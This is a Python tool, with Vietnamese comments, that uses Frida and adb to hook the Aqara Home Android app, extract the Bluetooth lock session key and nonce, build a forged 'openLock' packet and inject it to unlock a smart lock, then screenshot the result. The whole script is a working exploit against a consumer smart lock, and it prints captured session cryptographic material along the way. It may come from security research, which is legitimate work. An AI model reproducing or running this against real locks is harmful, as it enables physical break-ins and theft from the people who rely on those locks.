#!/usr/bin/env python3
import os, sys, time, subprocess, threading, frida

HOST=os.environ.get("FRIDA_HOST","127.0.0.1:47777"); PKG="com.lumiunited.aqarahome.play"; DEV=os.environ.get("ADB_SERIAL","")
if not DEV: raise SystemExit("Set ADB_SERIAL=<device serial> before running this tool.")
AGENT=os.path.join(os.path.dirname(__file__),"..","frida","ble_inject.js")
ROOT=os.path.join(os.path.dirname(__file__),"..")

def adb(*a): subprocess.run(["adb","-s",DEV,*a], capture_output=True)
def on_message(msg, data):
    if msg.get("type")=="send":
        p=msg["payload"]; t=p.get("tag")
        if t in ("ready","info","FOUND","inject"): print(f"[{t}]", {k:v for k,v in p.items() if k!='tag'})
        elif t=="sess": print(f"[sess] key={p['key']} nonce={p['nonce']} iv='{p['iv']}' pt={p.get('pt')}")
        elif t=="err": print("[JS-ERR]", p)
    elif msg.get("type")=="error": print("[ERR]", msg.get("stack",msg))

def main():
    dev=frida.get_device_manager().add_remote_device(HOST)
    pid=dev.spawn(PKG); print("spawn pid",pid)
    s=dev.attach(pid); sc=s.create_script(open(AGENT).read()); sc.on("message",on_message); sc.load(); dev.resume(pid)
    exp=sc.exports_sync if hasattr(sc,"exports_sync") else sc.exports
    time.sleep(8); adb("shell","monkey","-p",PKG,"1"); time.sleep(5)
    print("[*] mở trang khoá (tap card)"); adb("shell","input","tap","160","825")
    # chờ state đủ: gatt + char ff61 + sessionKey + nonce
    st=None
    for i in range(40):
        time.sleep(1)
        try: st=exp.state()
        except Exception as e: continue
        if st.get("hasGatt") and st.get("chr") and st.get("key") and st.get("nonce"):
            print(f"[*] SẴN SÀNG sau {i}s: gatt✓ char={st['chr'][:8]} key={st['key']} nonce={st['nonce']}")
            break
    else:
        print("[!] không đủ state:", st); return
    # dựng gói openLock bằng client
    pkt=subprocess.run(["bun","run","client/build_openlock.ts",st["key"],st["nonce"],"74","01"],
                       cwd=ROOT,capture_output=True,text=True).stdout.strip()
    print(f"[*] gói openLock client = {pkt}")
    # INJECT
    print("[*] >>> INJECT mở khoá <<<")
    try:
        r=exp.inject(pkt); print("[*] inject ->", r)
    except Exception as e:
        print("[!] inject lỗi:", e)
    time.sleep(5)
    # chụp log khoá xác nhận
    adb("shell","screencap","-p","/sdcard/inj.png"); adb("pull","/sdcard/inj.png","/tmp/inj.png")
    print("[*] xong — xem /tmp/inj.png + nghe khoá")
    time.sleep(3)

if __name__=="__main__": main()
